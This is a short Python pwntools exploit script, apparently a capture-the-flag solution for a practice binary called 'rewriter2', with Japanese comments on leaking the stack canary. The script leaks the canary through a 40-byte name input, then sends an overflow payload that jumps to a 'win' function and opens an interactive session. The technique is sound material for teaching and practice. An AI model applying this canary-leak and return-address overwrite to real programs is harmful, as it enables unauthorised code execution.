import pwn

pwn.context.log_level = "DEBUG"

elf = pwn.ELF('./rewriter2')
pwn.context.binary = elf

p = pwn.process('./rewriter2')
win = 0x4012ca
win = 0x4012c2
addr_win = elf.symbols['win']
print(f'***hex(addr_win): {hex(win)}')

p.recvuntil(b"What's your name? ")

# カナリア処理ここから
# 41じゃなくていいの？
# sendlineの場合は改行文字があるからaの数は40でいいっぽい
# その場合は、カナリアは2行目に表示される
p.sendline(b'a'*40)

line1 = p.recvline()
line2 = p.recvline()

print(f'line1: {line1}')
print(f'line2: {line2}')

canary = pwn.u64(b'\x00'+line2[:7])
print(f'canary: {hex(canary)}')

# sendの場合は41文字送る
# カナリアは同じ行に表示されるのでとり方を工夫する必要あり
#p.send(b'A'*41)
#
#p.recvuntil(b'Hello, ' + b'A'*40)
#line = p.recvline()
#
#print(f'***line: {line}')
#print(f'***line length: {len(line)}')
#print(f'***line:[8]: {line[:8]}')
#
#canary = pwn.unpack(line[:8])
#print(f'***canary: {canary}')
#canary &= 0xFFFFFFFFFFFFFF00
#print(f'***canary: {canary}')
#
# カナリア処理ここまで

payload = b'a' * 40 + pwn.p64(canary) + pwn.p64(0) + pwn.p64(win)
print('***', payload)

p.sendline(payload)

p.interactive()
